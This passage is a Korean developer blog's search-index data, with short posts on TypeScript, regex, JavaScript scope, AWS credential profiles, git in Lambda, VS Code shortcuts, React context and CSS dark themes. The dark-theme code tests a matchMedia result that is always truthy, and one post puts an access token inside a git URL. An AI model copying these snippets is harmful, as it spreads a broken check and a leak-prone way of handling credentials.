나는 코드 쓸 때 쉬프트 누르는 것을 별로 안 좋아한다. 쉬프트를 누르면 순간 느려지고 오타도 생기기도 하고.. 답답해진다 c나 java를 할 때도 일단 소문자로 쓰고 나중에 rename 기능을 통해 카멜 케이스로 변경할 만큼.. ts를 쓰면 이런 고민이 필요 없는 게 최초 1회만 잘 작성해두면 ctrl space만으로 코드를 작성할 수 있다 ㅋㅋㅋ 또 장점이라면 내가 잘못된 코드를 작성했을 때 실행도 시켜주지 않기 때문에 모르고 지나갈 수 없다 오류가 생기면 어디서 오류가 생겼는지 확실히 알 수 있다! 결론! 자동완성에 한번 빠지면 헤어 나올 수 없다 아니 이것도 자동완성이 된다고? 하는 곳까지 진짜 다 된다 ts하다가 js가면 한숨이 나올 것이다 타입스크립트 더 고수가 되고 생각나면 추가해야지..","link":"/2021/04/23/%EB%82%B4%EA%B0%80-%ED%83%80%EC%9E%85%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8%EB%A5%BC-%EC%93%B0%EB%8A%94-%EC%9D%B4%EC%9C%A0/"},{"title":"정규식으로 2개 이상 연속된 문자열 찾기","text":"123456const reg = /(.)\\1+/;reg.test(&quot;aa&quot;); //truereg.test(&quot;ab&quot;); //falsereg.test(&quot;cook&quot;); //true","link":"/2021/04/14/%EC%A0%95%EA%B7%9C%EC%8B%9D%EC%9C%BC%EB%A1%9C-2%EA%B0%9C-%EC%9D%B4%EC%83%81-%EC%97%B0%EC%86%8D%EB%90%9C-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0/"},{"title":"정규식으로 숫자를 포함하지 않는 것만 가져오기","text":"123456789const nickNameList = ['chinsung', 'chinsun99999999', '2021', 'regexp'];const noNumber = nickNameList.filter((nickName) =&gt; { const hasNumber = /\\d/; return !hasNumber.test(nickName);});console.log(noNumber); 배열에서 숫자를 포함하는 값만 뽑아보자 또는 숫자를 포함하는 값만 뽑아보자","link":"/2021/04/14/%EC%A0%95%EA%B7%9C%EC%8B%9D%EC%9C%BC%EB%A1%9C-%EC%88%AB%EC%9E%90%EB%A5%BC-%ED%8F%AC%ED%95%A8%ED%95%98%EC%A7%80-%EC%95%8A%EB%8A%94-%EA%B2%83%EB%A7%8C-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0/"},{"title":"js !! not not (double not)","text":"어느 날 조건문에서 !!을 본 적이 있다 처음에는 왜 쓸모없이 not을 2번 썼지?하면서 리팩토링이랍시고 !!을 지워버렸다 ㅋㅋㅋ 그런데 알아보니까 Boolean 타입으로 캐스팅해주는 것이었다 123if (!obj) return; // obj가 존재하면 다음 로직 진행// obj ... 나는 보통 obj가 유효한지 체크하려고 !을 붙여서 사용하곤 했는데 이미 !한 개를 붙이면 자동으로 Boolean으로 캐스팅된다 거기에 한 번 더 not을 하면 not not 이라서 Boolean(obj)와 똑같아진다는 것을 알 수 있다 참고 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Logical_NOT#double_not_!!","link":"/2021/04/26/js-not-not/"},{"title":"parseInt vs. Math.floor","text":"1234567891011let n = 1.1;console.log(Math.floor(n), parseInt(n)); // 1 1n = 1.9;console.log(Math.floor(n), parseInt(n)); // 1 1n = -1.1;console.log(Math.floor(n), parseInt(n)); // -2 -1n = -1.9;console.log(Math.floor(n), parseInt(n)); // -2 -1 소수점 이하를 버릴 때 Math.floor()(내림)를 주로 썼는데 음수에서 기대한 것과 다르게 동작하는 것을 알게 되었다… parseInt()는 매개변수로 문자열을 받기 때문에 주로 문자열로부터 숫자를 파싱 할 때 사용하는 줄 알았다 parseInt()는 매개변수로 string 타입이 아니면 스트링으로 자동 캐스팅하여 그냥 숫자를 넘겨줘도 잘 동작한다 ⚠️ 음 근데 문자열로 된 숫자를 인풋으로 줄 때 주의해야 한다 parseInt나 Math.floor나 상관없이 엄청나게 큰 문자열로 된 숫자를 number 타입으로 캐스팅하는 용도로 사용하면 안 된다 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/parseInt https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/BigInt","link":"/2021/04/26/parseInt-vs-Math-floor/"},{"title":"js scope 스코프, 렉시컬 스코프","text":"전역 변수, 지역 변수 구분하는 것이다 스코프 ; 중괄호로 묶인 영역 전역, 지역 변수지역변수는 바깥에서 사용할 수 없다1234567const f = () =&gt; { const x = 123; console.log(x);};f(); // 123console.log(x); // 에러 ; ReferenceError: x is not defined 함수 f 에 선언된 f의 지역변수 x를 바깥에서 사용하지 못하는 모습이다 전역 변수 사용12345678const x = 123;const f = () =&gt; { console.log(x);};console.log(x); // 123f(); // 123 반대로 함수에서는 바깥에 선언된 전역 변수 x를 사용할 수 있다 같은 변수명 일 때는 지역변수123456789const x = 123;const f = () =&gt; { const x = 999; console.log(x);};console.log(x); // 123f(); // 999 전역 변수, 지역 변수에 동일한 이름의 변수가 있으면 가까운 변수를 참조한다 스코프 체인123456789101112131415161718192021let x = 1;{ console.log(x); // 1 { x = 2; console.log(x); // 2 { let x = 111; console.log(x); // 111 { console.log(x); // 111 x = 222; console.log(x); // 222 } } }} 가깝다는 것은 일단 {} 스코프를 기준으로 일단 자기 자신이 속한 스코프에서 변수 x를 찾는다 없으면 상위 스코프에서 찾는다 찾을 때까지 반복한다 이를 스코프 체인이라고 한다 근데 이 스코프에 의한 전역, 지역 변수 구분은, 그러니까 내가 진짜로 참조하는 변수는 스코프를 선언할 때 결정된다 (렉시컬 스코핑) 렉시컬 스코핑렉시컬 스코핑12345678910111213let x = 1;const f = () =&gt; { console.log(x);};const main = () =&gt; { let x = 999; f(); // 1 console.log(x); // 999};main(); 선언할 때 결정된다는 것은 위 코드의 결과처럼 함수 f 가 선언 당시에 최상위 스코프의 let x = 1을 바라본다는 것이다 함수 main을 보면 함수 f가 실행되기 전에 스코프의 let x = 999는 함수 f에 영향을 주지 않는다 이런 개념들은 js를 하면서 그냥 익숙해져 있어서 용어로 설명할 수 있을 정도는 아니었다 이번 기회에 js 개념, 용어들을 정리해봐야겠다 참고 https://www.zerocho.com/category/JavaScript/post/5740531574288ebc5f2ba97e 스코프 ; https://developer.mozilla.org/ko/docs/Glossary/Scope 렉시컬 스코핑 ; https://developer.mozilla.org/ko/docs/Web/JavaScript/Closures#%EC%96%B4%ED%9C%98%EC%A0%81_%EB%B2%94%EC%9C%84_%EC%A7%80%EC%A0%95lexical_scoping","link":"/2021/04/26/js-scope-%EC%8A%A4%EC%BD%94%ED%94%84/"},{"title":"shell 파라미터 사용하기","text":"example.sh123echo &quot;zzzz $#&quot;echo &quot;zzzz $1&quot;echo &quot;zzzz $@&quot; $ ./example.sh 1 2 3zzzz 3zzzz 1zzzz 1 2 3 참고 https://jink1982.tistory.com/36","link":"/2021/04/28/shell-%ED%8C%8C%EB%9D%BC%EB%AF%B8%ED%84%B0-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"윈도우 aws cli 설치","text":"https://aws.amazon.com/ko/cli/ 들어가면 설치 프로그램으로 받을 수 있다 참고 https://aws.amazon.com/ko/cli/","link":"/2021/04/27/%EC%9C%88%EB%8F%84%EC%9A%B0-aws-cli-%EC%84%A4%EC%B9%98/"},{"title":"윈도우 aws sam cli 설치","text":"https://docs.aws.amazon.com/ko_kr/serverless-application-model/latest/developerguide/serverless-sam-cli-install-windows.html#serverless-sam-cli-install-windows-sam-cli 위 링크로 들어가면 설치 프로그램을 받을 수 있다 참고 https://docs.aws.amazon.com/ko_kr/serverless-application-model/latest/developerguide/serverless-sam-cli-install-windows.html#serverless-sam-cli-install-windows-sam-cli","link":"/2021/04/27/%EC%9C%88%EB%8F%84%EC%9A%B0-aws-sam-cli-%EC%84%A4%EC%B9%98/"},{"title":"aws lambda에서 git쓰기","text":"arn:aws:lambda:us-east-1:553035198032:layer:git-lambda2:8 람다 레이어에 위 arn을 추가한다 사용 런타임에 따라 다른 arn을 추가해야 한다는데 https://github.com/lambci/git-lambda-layer README.md를 확인해서 추가하자 상황 람다에서 git 명령을 사용하고 싶다 레이어 추가123456789Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: CodeUri: hello-world/ Handler: app.lambdaHandler Runtime: nodejs14.x Layers: - 'arn:aws:lambda:us-east-1:553035198032:layer:git-lambda2:8' # 여기를 추가!! sam template.yaml에서는 위와 같이 추가한다 또는 aws console로 직접 해당 람다에 가서 추가해 줄 수 있다 람다에서 깃 쓸 때 고려사항 람다에서는 가급적 가벼운 일을 해야 한다 git clone 한다면 /tmp 디렉터리에서 한다 (clone 옵션을 살펴서 최대한 필요한 것만 가져오자) 인증은 Personal access tokens을 사용했다 토큰이 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 이렇게 있을 때, https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@github.com/{레포 오너}/{레포 명}.git 이렇게 사용할 수 있다 참고 https://github.com/lambci/git-lambda-layer 람다 레이어 정리 ; https://chinsun9.github.io/2021/01/05/aws-sam-정리/","link":"/2021/04/28/aws-lambda%EC%97%90%EC%84%9C-git%EC%93%B0%EA%B8%B0/"},{"title":"aws credentials 여러개","text":"여러개의 자격 증명 프로필을 가질 수 있다 이 경우에 aws cli, aws sam cli 등 커맨드라인을 사용할 때 프로필을 지정해 줘야한다 프로필 추가terminal12# aws configure --profile {profile name}aws configure --profile newprofile AWS Access Key ID [None]: newAWS Secret Access Key [None]: newkeyDefault region name [None]:Default output format [None]: aws configure --profile {profile name} 명령을 치면 위 처럼 나오는데 여기에 키아이디와 키를 입력한다 %USERPROFILE%/.aws/credentials1234567[default]aws_access_key_id = xxxxxxxxxxxxxxxxxxxxaws_secret_access_key = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx[newprofile]aws_access_key_id = newaws_secret_access_key = newkey %USERPROFILE%/.aws/credentials 파일을 열어보면 위처럼 [default] 프로필 아래에 새로운 프로필이 등록되었을 것이다 프로필 스위치 나는 두 가지 방법을 써봤다 방법 1; AWS_PROFILE 환경 변수 설정 환경 변수 AWS_PROFILE을 원하는 프로필명으로 설정한다 set AWS_PROFILE {profilename} setx AWS_PROFILE {profilename} 이렇게 2가지를 사용할 수 있다 set은 해당 터미널에서만 적용된다. 해당 터미널이 닫히면 같이 날라간다 setx는 모든 터미널에서 적용된다. setx의 경우 모든 터미널을 닫았다가 열어야 적용된다. vscode 전부 닫았다가 켜야 적용된다 참고 ; 환경 변수 삭제 setx AWS_PROFILE &quot;&quot; 명명된 프로파일 ; https://docs.aws.amazon.com/ko_kr/cli/latest/userguide/cli-configure-profiles.html 12345# bashecho $AWS_PROFILE# cmd (windows)echo %AWS_PROFILE% 환경 변수 적용 확인을 꼭하자 방법 1은 가장 자주 쓰는 프로필을 지정할 때 좋을 것 같다 방법 2; 옵션 사용 환경변수 세팅 말고, aws cli를 사용할 때 --profile옵션을 줄 수 있다 aws cli를 사용하다 보면 옵션을 주지 않아도 프로필이 한 개가 아니면 명령을 실행하다가도 어떤 프로필을 사용할지 물어본다 근데 실수로 다른 계정에 배포를 할 수 있으니까.. --profile 옵션을 쓰는 게 좋을 것 같다 sam cli의 경우 deploy 할 때 sam deploy --profile newprofile 이런 식으로 할 수 있겠다 방법 2는 워크스페이스 별로 여러 프로필로 작업할 때 좋을 것 같다.. 헷갈리지 않도록 메모 필수..! sam deploy ; https://docs.aws.amazon.com/ko_kr/serverless-application-model/latest/developerguide/sam-cli-command-reference-sam-deploy.html 방법 3 (번외?); config file 사용 (aws-sdk) cli에 적용되는 것은 아닌데, nodejs app에서 aws sdk 자격 증명하는데 json 파일을 쓸 수 있다 로컬에서 개발하고 클라우드 환경으로 올릴 때, 그 환경마다 aws configure 하는 게 귀찮다 config.json12345{ &quot;accessKeyId&quot;: &quot;xxxxxxxxxxxxxxxxxxxx&quot;, &quot;secretAccessKey&quot;: &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;, &quot;region&quot;: &quot;ap-northeast-2&quot;} example.js123import AWS from 'aws-sdk';import path from 'path';AWS.config.loadFromPath(path.join(__dirname, './config.json')); json 파일로 자격 증명할 수 있다 참고 프로필 추가 ; https://docs.aws.amazon.com/ko_kr/cli/latest/userguide/cli-configure-quickstart.html 명명된 프로파일 ; https://docs.aws.amazon.com/ko_kr/cli/latest/userguide/cli-configure-profiles.html sam deploy ; https://docs.aws.amazon.com/ko_kr/serverless-application-model/latest/developerguide/sam-cli-command-reference-sam-deploy.html 구성 및 자격 증명 파일 설정 ; https://docs.aws.amazon.com/ko_kr/cli/latest/userguide/cli-configure-files.html?shortFooter=true 자격 증명 우선순위 ; https://docs.aws.amazon.com/ko_kr/sdk-for-javascript/v2/developer-guide/setting-credentials-node.html","link":"/2021/04/28/aws-credentials-%EC%97%AC%EB%9F%AC%EA%B0%9C/"},{"title":"좋은 사용자","text":"생활코딩님 커뮤니티 글을 보고.. https://www.youtube.com/channel/UCvc8kv-i5fvFTJBFAk6n1SA/community?lb=Ugx1aIE3Olb8931OhW54AaABCQ 사용자 이론에 대해 잘 몰라도 사용은 할 수 있다 사용해보면서 이 이론, 개념이 어떤 일을 할 수 있는지 알게 된다 그 이론, 개념이 내부적으로 어떻게 동작하는지 모르지만 컴퓨터 덕분에 복잡한 것을 쉽게 사용, 경험해 볼 수 있다 그래픽 도구로 이미지를 편집할 때에도 클릭 몇 번이면 멋진 효과를 줄 수 있다 내부적으로 어떻게 동작하는지 모르지만 이 도구를 사용하면 어떤 결과가 나오는지 알 수 있다 그러면서 이 도구를 어떻게 만들었는지 궁금해지고 그 원리에 대해 궁금해질 때도 있다 또는 이 도구를 사용했을 때 이런 결과가 나오니까 적절히 응용해서 더 멋진 결과를 만들어 낼 수도 있다 프로그램은 보통 내부적으로 어떤 일을 하는지 사용자는 알 수 없고, 딱히 알 필요도 없다 나는 OOP에서 추상화와 캡슐화가 이런 의미도 포함한다고 생각한다 좋은 사용자, 또 좋은 사용자를 만드는 사람이 되자 참고 https://www.youtube.com/channel/UCvc8kv-i5fvFTJBFAk6n1SA/community?lb=Ugx1aIE3Olb8931OhW54AaABCQ https://www.youtube.com/watch?v=C6VG4d28z3A","link":"/2021/04/28/%EC%A2%8B%EC%9D%80-%EC%82%AC%EC%9A%A9%EC%9E%90/"},{"title":"내가 사랑하는 vscode 단축키, 명령, 확장도구 모음","text":"vscode 관련 글을 여럿 썼는데, 검색해서 찾기에 조각조각인 내용들이 있어 하나의 글에 정리하려고 한다 cliterminal12345# 현재 디렉터리에서 code 열기code .# 현재 디렉터리를 vscode현재창에서 열기code . -r 단축키 ⭐F1 ; show all commands ; 명령 팔레트 열기 ⭐ctrl p ; go to file ; 파일 열기 ⭐ctrl alft arrow ; move editor into next group ; 분할창 이동 ⭐F2 ; rename symbol ; 변수명 변경 ⭐ctrl shift \\ ; go to bracket ; 괄호로 이동 ⭐ctrl shift r ; refactor ; 리팩토링 ⭐shift alt rifhtarrow ; expand selection ; 확장 선택 ⭐shift alt leftarrow ; shrink selection ; 축소 선택 ⭐shift alt i ; add cursors to line ends ; 선택영역의 라인마다 개별 커서 ⭐ctrl rightarrow ; cursor word end right ; 다음 단어로 이동 ⭐ctrl leftarrow ; cursor word left ; 이전 단어로 이동 ⭐ctrl shift v ; markdown preview ; 마크다운 미리보기 ⭐ctrl d ; add selection to next find match ; 현재 커서와 동일한 키워드들을 찾아서 선택 ⭐F12 ; go to definition ; 선언부로이동 ⭐ctrl leftclick ; go to definition ; 선언부로이동 alt F12 ; peek definition / peek references ; 선언, 참조 보기 ctrl 0 ; focus into side bar ; 사이드바 포커스 ctrl 1 ; focus editor group ; 에디터 포커스 ctrl shift . ; focus breadcrumbs ; 브레드크럼 포커스 ctrl t ; go to symbol in workspace ; 심볼로 바로가기 (범위 ; 워크스페이스 전체) ctrl shift o ; go to symbol in editor ; 심볼로 바로가기 (범위 ; 현재 포커스된 파일) ctrl ` ; toggle terminal ; 터미널뷰 토글 ctrl g ; go to line/colum ; 커서이동 ; 라인번호,칼럼번호 확장도구 ⭐ prettier ; 코드 포매터 ⭐ eslint ; 린트 ⭐ shell-launcher ; 여러 터미널 구성 ⭐ code-settings-sync ; vscode setting 클라우드 저장 ⭐ JavaScript (ES6) code snippets ; 코드 스니펫, 자동완성 도구 ⭐ TabOut ; 탭키로 괄호 탈출 vscode-pandoc ; md to word live share ; 실시간 멀티유저 코드 편집 vscode-sql-formatter ; sql 포매터 ascii tree generator ; 디렉터리 트리 스트링 생성 auto rename tag ; html 태그 자동 리네임 bracket pair colorizer ; 괄호색 구분 indent-rainbow ; 들여쓰기 색 구분 ⭐ live server ⭐ material icon theme ⭐ remote - ssh path intellisense rest client","link":"/2021/04/29/%EB%82%B4%EA%B0%80-%EC%82%AC%EB%9E%91%ED%95%98%EB%8A%94-vscode-%EB%8B%A8%EC%B6%95%ED%82%A4-%EB%AA%85%EB%A0%B9-%ED%99%95%EC%9E%A5%EB%8F%84%EA%B5%AC-%EB%AA%A8%EC%9D%8C/"},{"title":"shell &gt; vs. &gt;&gt;","text":"123456789touch a.txtecho 1 &gt; a.txt# 결과는 1echo 2 &gt; a.txt# 결과는 2echo 3 &gt;&gt; a.txt# 결과는 2\\n3 &gt; 덮어쓰기 &gt;&gt; 추가 참고 https://ko.wikipedia.org/wiki/리다이렉션","link":"/2021/04/29/shell-redirection/"},{"title":"202104 검색 실적","text":"","link":"/2021/05/04/202104-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"react table 연습","text":"표를 포함한 간단한 웹을 만들 때 부트스트랩 템플릿 안에 들어있는 datatables를 사용하곤 했었다 데이터가 쌓이지 않는 상황에서, 페이지네이션 및 필터링을 이미 제공하고 있기 때문에 내가 구현할 내용이 거의 없다는 게 장점이다 상황 나는 주로 리액트를 사용하는데, 이 부트스트랩 템플릿(html, js, css)을 그대로 리액트로 가져왔다 이 템플릿의 종속성인 vendor 디렉터리에 있는 내용들도 public으로 옮기고, 컴포넌트에서는 동적으로 이 종속성을 스크립트 태그로 로드하고 이 스크립트에서 사용하는 함수를 호출하기 위해서 window 객체에 담아서 실행하고.. 하지만 테이블 관련 동작을 커스텀하기도 어렵고,, 좋지 못한 구조로 가는 느낌이 들었다 그래서 리액트에서 사용할 수 있는 테이블 라이브러리를 찾다가 react-table을 공부해보기로 했다 따라하기 Codevolution React Table Tutorial을 보고 따라했다 타입스크립트로 따라하기type yarn add @types/react-table 타입스크립트로 진행하려면 필요하다 useTable()1234const tableInstance = useTable({ columns, // ts-err data,}); 1Type '({ Header: string; Footer: string; accessor: string; columns?: undefined; } | { Header: string; Footer: string; columns: { Header: string; Footer: string; accessor: string; }[]; accessor?: undefined; })[]' is not assignable to type 'Column&lt;{ ... }&gt;[]'. 위 에러 메시지가 나온다 12345const tableInstance = useTable({ // @ts-ignore columns, data,}); 위처럼 주석을 추가한다 다른 react-table typescript example을 보니까 // @ts-ignore을 사용하는 걸 참고 했다 자동완성 안됨123456789&lt;thead&gt; {headerGroups.map((headerGroup) =&gt; ( &lt;tr {...headerGroup.getHeaderGroupProps()}&gt; {headerGroup.headers.map((columns) =&gt; ( &lt;th {...columns.getHeaderProps()}&gt;{columns.render('Header')}&lt;/th&gt; ))} &lt;/tr&gt; ))}&lt;/thead&gt; 타입 추론이 안되고, 자동 완성도 안되고,, 해결 ; https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/react-table 위 링크의 Example type file을 프로젝트 src 디렉터리에 추가하니 해결됐다 레포 https://github.com/chinsun9/react-table-practice 참고 https://github.com/tannerlinsley/react-table","link":"/2021/05/07/react-table-practice/"},{"title":"styled components highlighting","text":"styled-components를 사용하는데, 구문 강조가 없어서 확장 도구를 살펴보았다 vscode-styled-components를 사용하면 하이라이트 및 스니펫을 사용이 가능하다 참고 https://marketplace.visualstudio.com/items?itemName=jpoissonnier.vscode-styled-components","link":"/2021/05/06/styled-components-highlighting/"},{"title":"vscode 포맷팅 없이 저장하기","text":"F1 &gt; File: Save without Formatting format on save 를 사용할 때, 크기가 큰 json 파일이 있을 수 있다 처음에는 // prettier-ignore을 최상단에 두어서 포맷팅 하지 않게 하였는데 주석을 넣으면 json파일을 읽지 못하게 되었다 그래서 명령 팔레트 열고 save 쳐보니까 포맷팅 없이 저장하는 방법이 있었다! 참고 특정 라인 prettier-ignore https://chinsun9.github.io/2020/11/24/prettier-ignore-line/","link":"/2021/05/06/vscode-%ED%8F%AC%EB%A7%B7%ED%8C%85-%EC%97%86%EC%9D%B4-%EC%A0%80%EC%9E%A5%ED%95%98%EA%B8%B0/"},{"title":"css 변수 사용하기","text":"style.css123456789101112131415:root { --a: pink; --b: black; --c: white;}button { background-color: var(--a);}/* 변수 --a 를 오버라이딩 */button.override { --a: green; background-color: var(--a);} :root는 전역 변수를 선언하는 곳이라고 생각하면 된다 --을 앞에 붙여야 한다 대소문자를 구분한다 var()함수로 변수를 가져다 사용할 수 있다 오버라이딩 가능하다 style.css123button { background-color: var(--a, red);} var() 함수에 2번째 인자를 넣어서, 대안 값을 지정할 수 있다 --a가 정의되지 않았을 때, 두 번째 인자 값을 사용한다 참고 https://developer.mozilla.org/ko/docs/Web/CSS/Using_CSS_custom_properties :root는 의사 클래스라고 한다","link":"/2021/05/21/css-%EB%B3%80%EC%88%98-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"오버라이딩 vs. 오버로딩","text":"123456789101112131415161718192021// 오버로딩 //void f() { // ...}void f(int a) { // ...}// 오버라이딩 //class Super { void f() { // print super }}class Sub extends Super { void f() { // print sub }} 예~~~전에 c++, java하면서 배운 헷갈리는 용어 정리!","link":"/2021/05/21/%EC%98%A4%EB%B2%84%EB%9D%BC%EC%9D%B4%EB%94%A9-vs-%EC%98%A4%EB%B2%84%EB%A1%9C%EB%94%A9/"},{"title":"CDN","text":"속도! 웹프로그래밍 시간에서 bootstrap, jquery, fontawesome 등 외부라이브러리를 CDN을 통해 사용해았다 데이터통신, 네트워크 관련 수업에서 CDN이 뭔지 배웠었다 CDN 콘텐츠 전송 네트워크, Content Delivery Network 나와 물리적으로 가까운 캐시 서버로부터 리소스를 가져온다 원래대로라면 원본 리소스를 가지고 있는 서버로부터 제공받는다 근데 원본 서버가 물리적으로 거리가 멀면 가져오는데 시간이 오래 걸린다 원본 서버의 부하도 줄여주고 속도도 빨라지도 좋다 보통 정적인 파일들(이미지, js, css)등을 CDN을 사용하여 배포한다 A, B가 같은 동네에 살고 있다 A가 asdf라는 파일을 다운로드하는데, 가장 가까운 캐시 서버에 asdf파일이 있는지 확인한다 없으면 하나 위로 가서 확인하고, 반복하다가 없으면 원본 서버까지 가서 받아온다 최초에 시간이 오래 걸렸지만, 이후 A가 asdf파일을 재요청했을 때 엄청 빨라졌음을 느꼈다 B도 asdf파일을 엄청 빨리 다운로드할 수 있었다 CDN 사용예 jquery, font awesome 등 라이브러리들을 보면 CDN 형태로 제공을 하고 있어서 head에 한 줄 넣기만 하면 해당 라이브러리의 기능을 쉽게 사용할 수 있다 CDN 말고 직접 배포 파일(dist, build)을 받아서 사용할 수 있지만, 실제 서비스를 할 때, 내 서버에서 해당 리소스를 제공해야 하므로 서버에 부하를 줄 수 있고, 느리다 라이브러리를 가져올 때, CDN을 사용했다면 이런 걱정을 할 필요가 없다 참고 https://ko.wikipedia.org/wiki/%EC%BD%98%ED%85%90%EC%B8%A0_%EC%A0%84%EC%86%A1_%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC","link":"/2021/05/31/cdn/"},{"title":"react ts context","text":"react에서 상위에서 하위 컴포넌트로 어떤 값을 보내 줄 때 prop으로 넘겨주게 된다 이게 1, 2단계 정도면 괜찮을 텐데, 더 깊어지면 엄청 불편해진다 넘기고 넘기고 넘기고 반복되는 것을 prop drilling이라고 한다 prop drilling으로 만들 때 긍정적인 점은 그만큼 각 컴포넌트가 느슨하게 연결되도록 만들었다는 게 아닐까..? 컴포넌트가 독립성을 가지게 해주는 것도 좋지만 재사용될지 모르는 것에 너무 힘을 쓰진 말자.. 전역적인 state를 사용하고 싶을 때 사용할 수 있겠다 리액트를 처음 배울 때 무작정 튜토리얼을 따라 하다가 redux를 배웠고, 나중에 context api 만으로 충분하다는 것을 알게 되었다 일단 다른 라이브러리를 설치하지 않고 충분히 가능하다는 것에 주로 사용하게 되었다 사용 흐름은 redux나 context api 유사하다 전역 저장소(스토어)를 생성하고, 각 컴포넌트에서는 dispatch를 통해서 상태를 업데이트할 수 있다 생성, 삭제가 있다고 하면 생성 액션, 삭제 액션이 있고 dispatch 할 때 어떤 액션을 할지 정해서 업데이트를 수행한다 실제 업데이트는 리듀서에서 된다. 리듀서에는 액션의 구현부?가 있다 참고 소스 코드GlobalContext.tsx123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* eslint-disable no-case-declarations */import React, { createContext, Dispatch, useContext, useReducer } from 'react';import { Comment } from '../types';type State = Map&lt;number, Comment&gt;;const initialState: State = new Map&lt;number, Comment&gt;();initialState.set(0, { id: 0, avatar: 'https://i.pravatar.cc/48', username: 'string', publishedTime: '1주 전', content: 'hello world!', likeCount: 999, dislikeCount: 0,});type CommentAction = { type: 'ADD_COMMENT'; comment: Comment };const CommentContext = createContext&lt;State&gt;(initialState);const CommentDispatch = createContext&lt;Dispatch&lt;CommentAction&gt;&gt;(() =&gt; null);let nextId = 0;function reducer(state: State, action: CommentAction): State { switch (action.type) { case 'ADD_COMMENT': const { comment } = action; nextId += 1; return new Map(state).set(nextId, { ...comment, id: nextId }); default: throw new Error('Unhandled action'); }}export default function GlobalContextProvider({ children,}: { children: React.ReactNode;}) { const [state, dispatch] = useReducer(reducer, initialState); return ( &lt;CommentContext.Provider value={state}&gt; &lt;CommentDispatch.Provider value={dispatch}&gt; {children} &lt;/CommentDispatch.Provider&gt; &lt;/CommentContext.Provider&gt; );}export function useCommentState() { return useContext(CommentContext);}export function useCommentDispatch() { return useContext(CommentDispatch);} 컨텍스트를 만들고 index.tsx123456789101112131415import React from 'react';import ReactDOM from 'react-dom';import './index.css';import App from './App';import reportWebVitals from './reportWebVitals';import GlobalContextProvider from './context/GlobalContext';ReactDOM.render( &lt;React.StrictMode&gt; &lt;GlobalContextProvider&gt; &lt;App /&gt; &lt;/GlobalContextProvider&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')); index.tsx에서 App을 감싸든 어디든 같은 컨텍스트로 묶어줄 상위 컴포넌트를 감싸준다 App.tsx12345678910111213141516171819function App() { const comment = useCommentState(); return ( &lt;Main&gt; &lt;Header /&gt; &lt;div className=&quot;contents&quot;&gt; {Array.from(comment).map(([id, data]) =&gt; { return ( &lt;div className=&quot;commentThread&quot; key={id}&gt; &lt;Comment data={data} /&gt; &lt;/div&gt; ); })} &lt;/div&gt; &lt;/Main&gt; );} 참조하여 사용할 때는 이렇게 Header.tsx1234567891011121314function Header() { const commentDispatch = useCommentDispatch(); // ... const onSubmitHandler = () =&gt; { commentDispatch({ type: 'ADD_COMMENT', comment, }); }; // ...} 상태를 업데이트하고 싶으면 이런 식으로 할 수 있겠다 참고 소스 코드 저장소 https://github.com/chinsun9/youtube-comments-phoenix/blob/v1/src/context/GlobalContext.tsx 참고 https://react.vlpt.us/using-typescript/04-ts-context.html https://chatoo2412.github.io/javascript/react/react-context-as-a-state-management-tool/ https://medium.com/@ca3rot/%EC%95%84%EB%A7%88-%EC%9D%B4%EA%B2%8C-%EC%A0%9C%EC%9D%BC-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-%EC%89%AC%EC%9A%B8%EA%B1%B8%EC%9A%94-react-redux-%ED%94%8C%EB%A1%9C%EC%9A%B0%EC%9D%98-%EC%9D%B4%ED%95%B4-1585e911a0a6","link":"/2021/05/25/react-context/"},{"title":"web dark theme","text":"깃허브 같은 웹페이지는 내가 다크 모드를 쓰는 걸 어떻게 알고, 자동으로 다크 테마를 지원하는 걸까? @media (prefers-color-scheme: dark) 미디어 쿼리로 시스템 테마를 읽어 올 수 있다 테마style.css12345678910111213141516171819:root { --top-bar: #dddddd; --activity-bar: #2c2c2c; --side-bar: #61616130; --editor: #ffffff; --editor-content: #000000; --status-bar: #007acc;}@media (prefers-color-scheme: dark) { :root { --top-bar: #3c3c3c; --activity-bar: #333333; --side-bar: #252526; --editor: #1e1e1e; --editor-content: #ffffff; --status-bar: #007acc; }} 테마는 이런 식으로 정의했다 미디어 쿼리에 걸리면 색상을 정의해둔 사용자 지정 속성들이 오버라이딩된다 색상은 vscode color theme default light, dark에서 가져왔다 테마 토글 버튼 시스템 테마와 별개로 웹페이지에서 테마를 토글 하고 싶을 때는 어떻게 해야 할까? body 태그에 dark라는 클래스를 유무에 따라 테마를 바꿔보자 테마 토글 버튼을 누르면 dark 클래스가 생기고 없어지면서 색상이 적용될 것이다 최초 접속자 테마 초기화index.js123// visit first timeconst isDark = window.matchMedia('(prefers-color-scheme: dark)');if (isDark) document.body.classList.add('dark'); 미디어 쿼리로는 최초 웹페이지 접속자가 어떤 테마를 사용할지 판단할 때 사용하도록 했다 토글 버튼index.js12345function toggleTheme() { console.log(`toggle theme`); document.body.classList.toggle('dark'); localStorage.setItem('theme', document.body.className ? 'dark' : 'light');} toggle은 있으면 없애고, 없으면 있게 만든다 toggle 후에는 현재 테마 상태를 localStorage에 저장한다 이후 접속 시 localStorage에서 theme에 값이 있는지 확인하고 있으면 해당 테마로 초기화한다 chrome에서 시스템 테마 쉽게 토글 하기 f12 개발자 도구에서 esc key 눌러서 하단 console 창을 뛰움 three dot (more 